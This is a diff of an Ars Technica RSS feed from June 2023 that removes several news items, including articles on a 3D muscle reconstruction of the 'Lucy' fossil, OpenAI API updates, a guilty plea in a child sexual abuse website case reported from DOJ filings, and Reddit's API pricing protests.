 <p><a href="https://arstechnica.com/?p=1947712&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/cars/2023/06/feds-tell-automakers-not-to-comply-with-mass-right-to-repair-law/feed/</wfw:commentRss>
-			<slash:comments>203</slash:comments>
+			<slash:comments>219</slash:comments>
 		
 		
 			</item>
@@ -904,340 +1369,7 @@
 <p><a href="https://arstechnica.com/?p=1947435&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/shopping/2023/06/dealmaster-last-minute-savings-to-celebrate-dads-and-grads/feed/</wfw:commentRss>
-			<slash:comments>19</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>3D muscle reconstruction shows 3.2 million-year-old “Lucy” walked upright</title>
-		<link>https://arstechnica.com/?p=1947108</link>
-					<comments>https://arstechnica.com/science/2023/06/3d-muscle-reconstruction-shows-3-2-million-year-old-lucy-walked-upright/#comments</comments>
-		
-		<dc:creator><![CDATA[Jennifer Ouellette]]></dc:creator>
-		<pubDate>Tue, 13 Jun 2023 23:01:43 +0000</pubDate>
-				<category><![CDATA[Science]]></category>
-		<category><![CDATA[ancient hominins]]></category>
-		<category><![CDATA[Biology]]></category>
-		<category><![CDATA[Biomechanics]]></category>
-		<category><![CDATA[computational modeling]]></category>
-		<category><![CDATA[evolutionary biology]]></category>
-		<category><![CDATA[human evolution]]></category>
-		<category><![CDATA[Lucy fossil]]></category>
-		<category><![CDATA[paleoanthropology]]></category>
-		<category><![CDATA[paleontology]]></category>
-		<guid isPermaLink="false">https://arstechnica.com/?p=1947108</guid>
-
-					<description><![CDATA["Lucy’s muscles suggest that she was as proficient at bipedalism as we are."]]></description>
-										<content:encoded><![CDATA[
-
-
-
-
-
-<div><a name='page-1'></a></div>
-<figure class="video ars-wp-video">
-    <div class="wrapper ars-wp-video-wrapper" style="padding-bottom: 56.122448979592%;">
-        <video class="wp-video-shortcode" id="video-1947108-1" width="980" height="550" preload="metadata" controls="controls"><source type="video/mp4" src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/LucyMuscle2.mp4?_=1" />3D reconstruction of lower limb muscles of <em>Australopithecus afarensis</em> fossil AL 288-1, aka "Lucy." Credit: Ashleigh Wiseman</video>    </div>
-        <figcaption class="caption">
-        <div class="caption-text">3D reconstruction of lower limb muscles of <em>Australopithecus afarensis</em> fossil AL 288-1, aka "Lucy." Credit: Ashleigh Wiseman </div>
-    </figcaption>
-    </figure>
-<p>One of the most famous fossils in human evolutionary history is known as "<a href="https://en.wikipedia.org/wiki/Lucy_(Australopithecus)">Lucy</a>," who belonged to an extinct species called <em>Australopithecus afarensis</em>—an early relative of <em>Homo sapiens</em> who was among the first hominins to walk upright. But scientists have long debated the extent of her bipedalism. Now a 3D digital re-creation of Lucy's muscular anatomy, combined with computer simulations, has reaffirmed that she was quite capable of walking fully erect. The results appeared in a new paper published in the journal Royal Society Open Science.</p>
-<p>“Lucy’s ability to walk upright can only be known by reconstructing the path and space that a muscle occupies within the body,” <a href="https://www.eurekalert.org/news-releases/992054">said author Ashleigh Wiseman</a>, an archaeologist at Cambridge University. “We are now the only animal that can stand upright with straight knees. Lucy’s muscles suggest that she was as proficient at bipedalism as we are, while possibly also being at home in the trees.”</p>
-<p>Lucy's remains were found in 1974 in Ethiopia at a site called Hadar. Several paleoarchaeologists—including Donald Johanson, Mary Leakey, and Yves Coppens—began surveying the site for signs of fossils relating to the origin of humans. The first interesting find occurred in November 1971, when Johanson found a fossilized upper shinbone and, nearby, the lower end of a femur. Now known as AL 129-1 and dating back more than 3 million years, the angle of the knee joint indicated this was a <a href="https://en.wikipedia.org/wiki/Hominini">hominin</a> (now known as <a href="https://en.wikipedia.org/wiki/Australopithecus_afarensis"><em>Australopithecus afarensi</em>s</a>) capable of walking upright.</p>
-<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/lucy-trio.jpg"><img alt='(left) Reconstruction of the fossil skeleton of &quot;Lucy.&quot; (center) Lucy skeleton reconstruction at the Cleveland Museum of Natural History. (right) Reconstruction of Lucy at the National Museum of Anthropology in Mexico.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/lucy-trio-640x427.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/lucy-trio.jpg 2x" alt='(left) Reconstruction of the fossil skeleton of &quot;Lucy.&quot; (center) Lucy skeleton reconstruction at the Cleveland Museum of Natural History. (right) Reconstruction of Lucy at the National Museum of Anthropology in Mexico.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/lucy-trio.jpg"class="caption-link" rel="nofollow">(left) Reconstruction of the fossil skeleton of "Lucy." (center) Lucy skeleton reconstruction at the Cleveland Museum of Natural History. (right) Reconstruction of Lucy at the National Museum of Anthropology in Mexico.</a> (credit: <a rel="nofollow" class="caption-link" href="https://creativecommons.org/licenses/by-sa/4.0/">120/Andrew Bardwell/Ernesto Lazaros /CC BY-SA 4.0</a>)</p></div>
-<p>But the really significant find occurred on November 24, 1974, when Johanson and fellow expedition member Tom Gray decided to check out the bottom of a small gully. Johanson spotted an arm bone fragment, then a skull fragment, then part of a femur. Further exploration over the next few weeks yielded many more bones, including vertebrae, part of a pelvis, ribs, and jaw fragments, all belonging to the same individual hominin. All told there were several hundred fossilized bone pieces constituting 40 percent of a complete female skeleton. This was "Lucy," aka AL 288-1, named after the 1967 Beatles tune "Lucy in the Sky with Diamonds," which had been played loudly and repeatedly on a camp tape recorder.</p>
-<p>Once all the pieces were assembled, scientists were able to reconstruct Lucy, revealing that she stood about 1.1 meters (3 feet, 7 inches) tall and weighed about 29 kilograms (64 pounds). Her brain was small, like a chimpanzee's, but her pelvis and leg bones (including a <a href="https://en.wikipedia.org/wiki/Genu_valgum">valgus knee</a>) looked almost identical to modern humans, indicating that <a href="https://en.wikipedia.org/wiki/Australopithecus_afarensis"><em>Australopithecus afarensis</em></a> was fully bipedal, i.e., stood upright and walked erect.</p>
-<p>How Lucy died is a matter of heated scientific debate. A controversial <a href="https://www.nature.com/articles/nature19332">2016 paper</a> suggested that a careful analysis of her bones reveals how she died—by falling to her death from a very tall tree—although other scientists (including Johanson) thought the evidence was thin at best. As <a href="https://arstechnica.com/science/2016/08/doubts-about-whether-ancient-hominin-lucy-fell-to-her-death-3-18-million-years-ago/">we reported</a> at the time, University of Texas-Austin anthropologist John Kappelman and his team did a complete X-ray CT scan on Lucy's bones, allowing them to create high-resolution 3D renders and 3D printouts of her skeleton.</p>
-<p>By comparing the way her bones had fragmented with contemporary X-rays from people who fell, they concluded that the fragmentation of her leg bone was "green," that is, it took place right before she died. Specifically, the joint in Lucy's leg suffered from extreme compression of the type you'd expect in somebody who fell on their feet from a great height, perhaps out of a local tree where nests might be as many as 23 meters off the ground. However, skeptics pointed out that the process of fossilization often fragments bones in exactly the way that Lucy's bones are broken, and animals fossilized at the same time as Lucy have similar fractures.</p>
-<div><a name='page-2'></a></div>
-<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/lucy3.jpg"><img alt='Polygonal muscles of &quot;Lucy&quot; compared to 3D muscles of a human.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/lucy3-640x757.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/lucy3.jpg 2x" alt='Polygonal muscles of &quot;Lucy&quot; compared to 3D muscles of a human.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/lucy3.jpg"class="caption-link" rel="nofollow">Polygonal muscles of "Lucy" compared to 3D muscles of a human.</a> (credit: Ashleigh Wiseman)</p></div>
-<p>There has also been significant debate over precisely how frequently and efficiently Lucy and her fellow <em>Australopithecus afarensis</em> walked. Specifically, Lucy had a much wider pelvis and shorter legs than a human, which some scholars have argued would have affected her gait. A consensus has begun to emerge in recent years in favor of a fully erect gait, rather than more of a crouching waddle, similar to chimpanzees. Wiseman decided to use computer simulations and muscle modeling in hopes of shedding further light on the issue.</p>
-<p>She was inspired in part by <a href="https://www.nature.com/articles/s41598-022-07074-x">the work</a> of paleobiologist Oliver Demuth, who creates biomechanical <a href="https://dawndinos.com/musculoskeletal-modelling-and-simulation-of-movement/">3D musculoskeletal models</a> of <a href="https://dawndinos.com/extinct-archosaurs/">extinct archosaurs</a>. Extinct species mostly leave behind fossilized bones and skeletons, and while much can be learned from those remains, one needs to find a way to re-create the overlaying muscles to understand the biomechanics of how a given species moved. Demuth first used the limb anatomy of existing species to create 3D musculoskeletal models of known animals and then simulated movements like walking running, jumping, or standing. Then he extended and adapted those models to extinct animals.</p>
-<p>Wiseman followed a similar course of action for her own work re-creating Lucy's musculature. First, she relied upon MRI scans and CT scans of adult female and male humans to map muscle paths and create a feasible 3D digital musculoskeletal model. Next, she used recently published open source virtual models of the Lucy fossil to put her skeleton back together, showing how each joint could move and rotate. Finally, she layered the muscles on top, relying on her map of human muscle paths, augmented by a few telltale traces of scarring from where muscle had once connected to Lucy's fossilized bones.</p>
-<figure class="video ars-wp-video">
-    <div class="wrapper ars-wp-video-wrapper" style="padding-bottom: 56.122448979592%;">
-        <video class="wp-video-shortcode" id="video-1947108-2" width="980" height="550" preload="metadata" controls="controls"><source type="video/mp4" src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/LucyMuscle1.mp4?_=2" />3D polygonal model, guided by imaging scan data and muscle scarring, reconstructing the lower limb muscles of the <em>Australopithecus afarensis</em> fossil AL 288-1, aka "Lucy." Credit: Ashleigh Wiseman</video>    </div>
-        <figcaption class="caption">
-        <div class="caption-text">3D polygonal model, guided by imaging scan data and muscle scarring, reconstructing the lower limb muscles of the <em>Australopithecus afarensis</em> fossil AL 288-1, aka "Lucy." Credit: Ashleigh Wiseman </div>
-    </figcaption>
-    </figure>
-<p>The resulting model included 36 muscles in each leg. Per Wiseman, Lucy had much larger calves and thighs than modern humans; the major muscles were more than twice the size. Fully 74 percent of Lucy's thigh consisted of muscle tissue compared to 50 percent in humans. Wiseman concluded that Lucy's knee extensor muscles would allow for sufficient leverage to straighten the knee joints like modern humans, thereby enabling Lucy to walk upright, as well as performing a range of other motions similar to chimpanzees and bonobos.</p>
-<p>These findings add further evidence to the emerging scientific consensus, but Wiseman cautioned that this is not definitive proof that Lucy could walk erect frequently and efficiently. "Lucy likely walked and moved in a way that we do not see in any living species today,” <a href="https://www.eurekalert.org/news-releases/992054?">she said</a>. “<em>Australopithecus afarensis</em> would have roamed areas of open wooded grassland as well as more dense forests in East Africa around 3 to 4 million years ago. These reconstructions of Lucy’s muscles suggest that she would have been able to exploit both habitats effectively.”</p>
-<p>DOI: Royal Society Open Science, 2023. <a href="http://dx.doi.org/10.1098/rsos.230356">10.1098/rsos.230356</a>  (<a href="http://arstechnica.com/science/news/2010/03/dois-and-their-discontents-1.ars">About DOIs</a>).</p>
-
-<p><a href="https://arstechnica.com/?p=1947108&comments=1">Read Comments</a></p>]]></content:encoded>
-					
-					<wfw:commentRss>https://arstechnica.com/science/2023/06/3d-muscle-reconstruction-shows-3-2-million-year-old-lucy-walked-upright/feed/</wfw:commentRss>
-			<slash:comments>36</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>OpenAI rolls out big chatbot API upgrades for developers</title>
-		<link>https://arstechnica.com/?p=1947545</link>
-					<comments>https://arstechnica.com/information-technology/2023/06/openai-rolls-out-big-chatbot-api-upgrades-for-developers/#comments</comments>
-		
-		<dc:creator><![CDATA[Benj Edwards]]></dc:creator>
-		<pubDate>Tue, 13 Jun 2023 21:48:24 +0000</pubDate>
-				<category><![CDATA[AI]]></category>
-		<category><![CDATA[Biz & IT]]></category>
-		<category><![CDATA[AI developers]]></category>
-		<category><![CDATA[API]]></category>
-		<category><![CDATA[GPT-3]]></category>
-		<category><![CDATA[GPT-3.5]]></category>
-		<category><![CDATA[gpt-3.5-turbo]]></category>
-		<category><![CDATA[GPT-4]]></category>
-		<category><![CDATA[large language models]]></category>
-		<category><![CDATA[machine learning]]></category>
-		<category><![CDATA[openai]]></category>
-		<guid isPermaLink="false">https://arstechnica.com/?p=1947545</guid>
-
-					<description><![CDATA[API updates include 4x larger conversation memory for GPT-3.5 and function calling.]]></description>
-										<content:encoded><![CDATA[
-<figure class="intro-image intro-left">
-  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/chatgpt_superhero-800x450.jpg" alt="An AI-generated chatbot flying like a superhero."/>
-      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/chatgpt_superhero.jpg" class="enlarge-link" data-height="675" data-width="1200">Enlarge</a> <span class="sep">/</span> An AI-generated chatbot flying like a superhero. (credit: Stable Diffusion / OpenAI)</p>  </figure>
-
-
-
-
-
-
-<div><a name='page-1'></a></div>
-<p>On Tuesday, OpenAI <a href="https://openai.com/blog/function-calling-and-other-api-updates">announced</a> a sizable update to its large language model API offerings (including <a href="https://arstechnica.com/information-technology/2023/03/openai-announces-gpt-4-its-next-generation-ai-language-model/">GPT-4</a> and <a href="https://arstechnica.com/information-technology/2023/03/chatgpt-and-whisper-apis-debut-allowing-devs-to-integrate-them-into-apps/">gpt-3.5-turbo</a>), including a new function-calling capability, significant cost reductions, and a 16,000 token context window option for the gpt-3.5-turbo model.</p>
-
-<p>In large language models (LLMs), the "context window" is like a short-term memory that stores the contents of the prompt input or, in the case of a chatbot, the entire contents of the ongoing conversation. In language models, increasing context size has become a technological race, with Anthropic <a href="https://arstechnica.com/information-technology/2023/05/anthropics-claude-ai-can-now-digest-an-entire-book-like-the-great-gatsby-in-seconds/">recently announcing</a> a 75,000-token context window option for its Claude language model. In addition, OpenAI has developed a <a href="https://arstechnica.com/information-technology/2023/03/openai-announces-gpt-4-its-next-generation-ai-language-model/">32,000-token</a> version of GPT-4, but it is not yet publicly available.</p>
-<p>Along those lines, OpenAI just introduced a new 16,000 context window version of gpt-3.5-turbo, called, unsurprisingly, "gpt-3.5-turbo-16k," which allows a prompt to be up to 16,000 tokens in length. With four times the context length of the standard 4,000 version, gpt-3.5-turbo-16k can process around 20 pages of text in a single request. This is a considerable boost for developers requiring the model to process and generate responses for larger chunks of text.</p>
-<p>As covered in detail in the announcement post, OpenAI listed at least four other major new changes to its GPT APIs:</p>
-<ul>
-<li>Introduction of function-calling feature in the <a href="https://platform.openai.com/docs/guides/gpt">Chat Completions API</a></li>
-<li>Improved and "more steerable" versions of GPT-4 and gpt-3.5-turbo</li>
-<li>A 75 percent price cut on the "ada" embeddings model</li>
-<li>A 25 percent price reduction on input tokens for gpt-3.5-turbo.</li>
-</ul>
-<p>With function calling, developers can now more easily build chatbots capable of calling external tools, converting natural language into external API calls, or making database queries. For example, it can convert prompts such as, "Email Anya to see if she wants to get coffee next Friday" into a function call like, "send_email(to: string, body: string)." In particular, this feature will also allow for consistent <a href="https://en.wikipedia.org/wiki/JSON">JSON</a>-formatted output, which API users previously had difficulty generating.</p>
-
-<p>Regarding "steerability," which is a fancy term for the process of getting the LLM to behave the way you want it to, OpenAI says its new "gpt-3.5-turbo-0613" model will include "more reliable steerability via the system message." The system message in the API is a special directive prompt that tells the model how to behave, such as "You are <a href="https://arstechnica.com/gaming/2023/06/for-reasons-no-one-can-fathom-mcdonalds-has-released-a-new-game-boy-color-game/">Grimace</a>. You only talk about milkshakes."</p>
-<p>In addition to the functional improvements, OpenAI is offering substantial cost reductions. Notably, the price of the popular gpt-3.5-turbo’s input tokens has been reduced by 25 percent. This means developers can now use this model for approximately $0.0015 per 1,000 input tokens and $0.002 per 1,000 output tokens, equating to roughly 700 pages per dollar. The gpt-3.5-turbo-16k model is priced at $0.003 per 1,000 input tokens and $0.004 per 1,000 output tokens.</p>
-<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/03/how_gpt_models_work.jpg"><img alt='A diagram showing how GPT conversational language model prompting works.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/03/how_gpt_models_work-640x522.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/03/how_gpt_models_work.jpg 2x" alt='A diagram showing how GPT conversational language model prompting works.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/03/how_gpt_models_work.jpg"class="caption-link" rel="nofollow">A diagram showing how GPT conversational language model prompting works.</a> (credit: Benj Edwards / Ars Technica)</p></div>
-<p>Further, OpenAI is offering a massive 75 percent cost reduction for its "<a href="https://openai.com/blog/new-and-improved-embedding-model">text-embedding-ada-002</a>" embeddings model, which is more esoteric in use than its conversational brethren. An embeddings model is like a translator for computers, turning words and concepts into a numerical language that machines can understand, which is important for tasks like searching text and suggesting relevant content.</p>
-
-<p>Since OpenAI keeps updating its models, the old ones won't be around forever. Today, the company also announced it is beginning the deprecation process for some earlier versions of these models, including gpt-3.5-turbo-0301 and gpt-4-0314. The company says that developers can continue to use these models until September 13, after which the older models will no longer be accessible.</p>
-<p>It's worth noting that OpenAI's GPT-4 API is still <a href="https://openai.com/waitlist/gpt-4-api">locked behind a waitlist</a> and yet widely available.</p>
-
-<p><a href="https://arstechnica.com/?p=1947545&comments=1">Read Comments</a></p>]]></content:encoded>
-					
-					<wfw:commentRss>https://arstechnica.com/information-technology/2023/06/openai-rolls-out-big-chatbot-api-upgrades-for-developers/feed/</wfw:commentRss>
-			<slash:comments>37</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>Lead admin of child sex abuse website pleads guilty, faces 20 years to life</title>
-		<link>https://arstechnica.com/?p=1947631</link>
-					<comments>https://arstechnica.com/tech-policy/2023/06/lead-admin-of-child-sex-abuse-website-pleads-guilty-faces-20-years-to-life/#comments</comments>
-		
-		<dc:creator><![CDATA[Jon Brodkin]]></dc:creator>
-		<pubDate>Tue, 13 Jun 2023 21:25:20 +0000</pubDate>
-				<category><![CDATA[Policy]]></category>
-		<category><![CDATA[child pornography]]></category>
-		<category><![CDATA[child sexual abuse]]></category>
-		<guid isPermaLink="false">https://arstechnica.com/?p=1947631</guid>
-
-					<description><![CDATA[DOJ: Website had "section devoted to the sexual abuse of infants and toddlers."]]></description>
-										<content:encoded><![CDATA[
-<figure class="intro-image intro-left">
-  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/GettyImages-519951874-800x537.jpg" alt="The bars of a jail cell are pictured along with a man's hand turning a key in the lock of the cell door."/>
-      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/GettyImages-519951874-scaled.jpg" class="enlarge-link" data-height="1718" data-width="2560">Enlarge</a> (credit: Getty Images | Charles O'Rear)</p>  </figure>
-
-
-
-
-
-
-<div><a name='page-1'></a></div>
-<p>A man described as the lead administrator of a child sexual abuse website pleaded guilty to engaging in a child exploitation enterprise and faces a sentence of at least 20 years and possibly life in prison. The website was "dedicated to the advertisement and distribution of images and videos depicting child sexual abuse," the federal government said.</p>
-<p>William Michael Spearman, a 57-year-old from Alabama, pleaded guilty yesterday in US District Court for the Southern District of Florida, the US Department of Justice <a href="https://www.justice.gov/opa/pr/man-pleads-guilty-running-child-sexual-abuse-website">announced</a>. Four other defendants were previously convicted of crimes related to "their involvement with the same website," the DOJ said.</p>
-<p>"The website included a section devoted to the sexual abuse of infants and toddlers, a section devoted to images and videos depicting children being subjected to pain and torture, and a section devoted to avoiding detection by law enforcement," the DOJ said. "As the lead administrator, Spearman managed numerous 'staff' members, directed them how to help run the site, recommended other users for promotion, kept records of child pornography files advertised and distributed over the site, presided over staff meetings, praised and scolded users, and counseled users and other managers about the function and expectations of the website. Spearman also advertised and distributed images over the website."</p>
-<p>Spearman is scheduled to be sentenced on August 31. He "faces a mandatory minimum sentence of 20 years in prison and a maximum sentence of life in prison," the announcement said.</p>
-<h2>Website had 100+ registered users</h2>
-<p>FBI Special Agent David Backlund described details of the case in a November 2022 <a href="https://storage.courtlistener.com/recap/gov.uscourts.flsd.623852/gov.uscourts.flsd.623852.1.0.pdf">affidavit</a>. The website—referred to as "target website" in the affidavit—had at least 100 registered members who accessed their accounts with passwords, Backlund wrote.</p>
-<p>Website users "traffic in child pornography images and videos via the posting of web links within messages," the affidavit said. "These links allow a user to navigate to another website, such as a file-hosting website, where images and/or videos were stored in order to download these images and videos. When posting the links, users of the target website also generally include descriptive text that provides information about the sexual acts and age and gender of the child victim depicted in the linked-to child pornography files. The target website provides rules that instruct users to share child pornography in this manner."</p>
-<p>Defendant Selwyn Rosenstein was previously convicted of conspiracy to advertise child pornography, five counts of advertisement of child pornography, and possession of child pornography, the DOJ said. He was sentenced to 28 years in prison and ordered to pay $85,000 in restitution to victims.</p>
-<p>Defendants Gregory Good, Robert Boyles, and Matthew Garrell were convicted of conspiracy to advertise child pornography and conspiracy to distribute child pornography. Their sentencing hearings are scheduled for August.</p>
-<div><a name='page-2'></a></div>
-<h2>Shared URLs led to sexual abuse images</h2>
-<p>The FBI found that Spearman "has, on more than three occasions, shared thousands of URL links to child pornography via the target website that were accessible to more than 10 other target website users," the affidavit said.</p>
-<p>The affidavit describes three occasions in which Spearman shared a "collection of links" to images of child sexual abuse, and in each case the affidavit details one of the links from the larger collection. One link allegedly shared by Spearman led to "child pornography files [that] depicted a young girl being sexually abused by an older woman," the affidavit said.</p>
-<p>Another link shared by Spearman led to an album containing 21 images showing prepubescent girls performing sex acts on men, the affidavit said.</p>
-<p>Spearman is also said to have shared a link that "redirected to another website that contained 79 images of a known female victim who was estimated to be between the ages of seven and nine at the time of the abuse."</p>
-<h2>Home search found laptop and thumb drive</h2>
-<p>The FBI executed a search warrant at Spearman's residence in Madison, Alabama, in early November. "During the execution of the search warrant, after being advised of his rights, Spearman admitted to FBI agents that he was the subject user on the target website," Backlund's affidavit said. "He stated that he had been on the target website since approximately 2018, had shared child pornography over the site, and had taken steps to manage the site. He also stated that he maintained child pornography on devices in his residence."</p>
-<p>FBI agents searched a laptop in Spearman's garage and found evidence of Spearman accessing the target website and a related website "that is also dedicated to child sexual exploitation," the affidavit said. Agents also found a thumb drive containing "a large volume of child pornography," Backlund wrote.</p>
-<p>Spearman's guilty plea to the count of engaging in a child exploitation enterprise is conditional and could be withdrawn if his pending motion to suppress evidence is granted.</p>
-<p>"The defendant's motion alleged the warrantless seizure of his Internet Protocol address (IP address) and sought to suppress all physical evidence seized and statements as fruit of the poisonous tree as a result of the execution of a search warrant of his residence and person," according to the <a href="https://storage.courtlistener.com/recap/gov.uscourts.flsd.623852/gov.uscourts.flsd.623852.148.0.pdf">plea agreement</a> filed by the US Attorney's Office for the Southern District of Florida. "This office and the defendant agree that an order suppressing the subject evidence, or an appeal granting such relief, is case dispositive."</p>
-<p>As part of the plea agreement, the US Attorney's Office agreed to seek dismissal of two of the three counts in the <a href="https://storage.courtlistener.com/recap/gov.uscourts.flsd.623852/gov.uscourts.flsd.623852.12.0.pdf">indictment</a> of Spearman. The to-be-dismissed counts are conspiracy to advertise child pornography and conspiracy to distribute child pornography. Still, the plea agreement says the defendant understands that the court must impose a sentence of at least 20 years in prison "and may impose a statutory maximum term of life imprisonment."</p>
-
-<p><a href="https://arstechnica.com/?p=1947631&comments=1">Read Comments</a></p>]]></content:encoded>
-					
-					<wfw:commentRss>https://arstechnica.com/tech-policy/2023/06/lead-admin-of-child-sex-abuse-website-pleads-guilty-faces-20-years-to-life/feed/</wfw:commentRss>
-			<slash:comments>111</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>Reddit CEO assures employees that API pricing protests haven’t hurt revenue</title>
-		<link>https://arstechnica.com/?p=1947571</link>
-					<comments>https://arstechnica.com/gadgets/2023/06/reddit-ceo-assures-employees-that-api-protests-havent-hurt-revenue/#comments</comments>
-		
-		<dc:creator><![CDATA[Scharon Harding]]></dc:creator>
-		<pubDate>Tue, 13 Jun 2023 21:01:32 +0000</pubDate>
-				<category><![CDATA[Policy]]></category>
-		<category><![CDATA[Tech]]></category>
-		<category><![CDATA[API]]></category>
-		<category><![CDATA[reddit]]></category>
-		<category><![CDATA[social media]]></category>
-		<guid isPermaLink="false">https://arstechnica.com/?p=1947571</guid>
-
-					<description><![CDATA[Furor "will pass," Huffman says in internal memo reportedly viewed by The Verge.]]></description>
-										<content:encoded><![CDATA[
-<figure class="intro-image intro-left">
-  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/GettyImages-1232875671-800x531.jpg" alt="In this photo illustration the American social news"/>
-      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/GettyImages-1232875671-scaled.jpg" class="enlarge-link" data-height="1700" data-width="2560">Enlarge</a> (credit: <a rel="nofollow" class="caption-link" href="https://www.gettyimages.com/detail/news-photo/in-this-photo-illustration-the-american-social-news-news-photo/1232875671">Reddit</a>)</p>  </figure>
-
-
-
-
-
-
-<div><a name='page-1'></a></div>
-<p>There are<a href="https://www.twitch.tv/reddark_247"> nearly 8,500 subreddits</a> that are private or read-only right now in protest over Reddit's upcoming API price hike. The protest started on June 12, <a href="https://arstechnica.com/gadgets/2023/06/api-pricing-protests-caused-reddit-to-crash-for-3-hours/">crashed Reddit for three hours</a>, and is scheduled to continue until June 14. Reddit CEO Steve Huffman, according to an internal memo reportedly viewed by <a href="https://www.theverge.com/2023/6/13/23759559/reddit-internal-memo-api-pricing-changes-steve-huffman">The Verge </a>today, isn't <em>too</em> worried, though, since it hasn't hurt Reddit's pockets yet.</p>
-<p>According to The Verge (where you can view the full memo), Huffman sent the note to employees on Monday afternoon. It starts by noting the "challenge" from the <a href="https://arstechnica.com/gadgets/2023/06/reddits-plan-to-kill-third-party-apps-sparks-widespread-protests/">Reddit API pricing protest</a>.</p>
-<p>"We do anticipate many of [the subreddits] will come back by Wednesday, as many have said as much. While we knew this was coming, it is a challenge nevertheless, and we have our work cut out for us," the note reportedly says. "A number of Snoos [Reddit's nickname for employees] have been working around the clock, adapting to infrastructure strains, engaging with communities, and responding to the myriad of issues related to this blackout."</p>
-<h2>This, too, shall pass</h2>
-<p>Then, the note seemingly seeks to calm employee anxieties or fears around the protests by depicting the blackout as a temporary occurrence that hasn't yet impacted Reddit's finances:</p>
-<blockquote><p>We have not seen any significant revenue impact so far and we will continue to monitor.</p>
-<p>There’s a lot of noise with this one. Among the noisiest we’ve seen. Please know that our teams are on it, and like all blowups on Reddit, this one will pass as well.</p></blockquote>
-<p>Some subreddits have said they will go dark indefinitely. As of this writing, 8,444 subreddits are protesting, according to the <a href="https://reddark.untone.uk/">Reddark counter</a>, which says 8,838 subreddits pledged to join.</p>
-<p>Similar to how <a href="https://arstechnica.com/tech-policy/2023/02/cash-strapped-twitter-to-start-charging-developers-for-api-access-next-week/">Twitter was</a> accosted when it jacked up its API pricing in February, Reddit has been accused of corporate greed as it seeks to suddenly charge what some argue are exorbitant amounts for something that used to be free.</p>
-<p>For its part, Reddit hasn't been shy about its desire to make money, especially considering many popular third-party Reddit apps don't run Reddit's ads, its biggest source of revenue.</p>
-<p>"Reddit needs to be fairly paid to continue supporting high-usage third-party apps. Our pricing is based on usage levels that we measure to be comparable to our own costs," Reddit spokesperson Tim Rathschmidt <a href="https://arstechnica.com/gadgets/2023/06/reddit-insists-on-being-fairly-paid-amid-api-price-protest-plans-layoffs/">said</a> in a statement to Bloomberg on June 6.</p>
-<p>News of Reddit's <a href="https://www.reuters.com/markets/us/reddit-files-us-ipo-2021-12-16/">initial public offering</a> has drawn further attention during this spectacle, as <a href="https://www.theinformation.com/articles/reddit-aims-for-ipo-in-second-half-as-markets-gears-quietly-turn" rel="nofollow" data-ml-dynamic="true" data-ml-dynamic-type="sl" data-orig-url="https://www.theinformation.com/articles/reddit-aims-for-ipo-in-second-half-as-markets-gears-quietly-turn" data-ml-id="1" data-ml="true" data-xid="fr1686683604018cch" data-skimlinks-tracking="xid:fr1686683604018cch" data-uri="00826ae77eb876a974b820674d4a6284">The Information</a> in February reported that Reddit aims to go public in 2023. Additionally, there's a sense that Reddit is seeking greater control over its platform.</p>
-<p>Huffman's memo reportedly said that the long-term solution to challenges brought on by the protests is to improve Reddit and noted "a few upcoming critical mod tool launches we need to nail."</p>
-<p>Reddit recently started allowing <a href="https://arstechnica.com/gadgets/2023/05/reddit-welcomes-nsfw-desktop-image-uploads-ahead-of-imgurs-ban/">NSFW image uploads</a> on its desktop app but will remove NSFW content from third-party apps with its API changes, attributing the move to<a href="https://techcrunch.com/2023/06/09/reddit-ceo-doubles-down-on-attack-on-apollo-developer-in-drama-filled-ama/"> regulatory concerns</a>. Reddit has also refrained from offering any compromise that would see lower API fees for developers that run Reddit's ads.</p>
-<p>Further, Reddit showed interest in growing the use of its apps when it experimented with <a href="https://www.reddit.com/r/help/comments/135tly1/comment/jim40zg/">blocking logged-in mobile browser access</a> earlier this year.</p>
-<h2>Community consequences</h2>
-<p>Reddit might not have seen any financial consequences yet. But its announced API fees, the revelation that those fees would cost it <a href="https://arstechnica.com/gadgets/2023/05/reddits-api-pricing-results-in-shocking-20-million-a-year-bill-for-apollo/">$20 million a year</a> for one third-party app, and the backlash from other developers, users, and moderators have shaken the Reddit community. It's hard to quantify that impact, but a sense of community is why some people visit Reddit in the first place.</p>
-<p>Huffman's note, according to The Verge, said:</p>
-<blockquote><p>I am sorry to say this, but please be mindful of wearing Reddit gear in public. Some folks are really upset, and we don’t want you to be the object of their frustrations.</p></blockquote>
-<p>In an active <a href="https://www.reddit.com/r/reddit/comments/145bram/addressing_the_community_about_changes_to_our_api/" data-uri="0b7bd1abc9fc933f0aad7979e931e5bf">Q&amp;A</a> on Friday, someone asked Huffman if he was concerned "that Reddit has become increasingly profit-driven and less focused on community engagement," and his response didn't foster a sense of community either.</p>
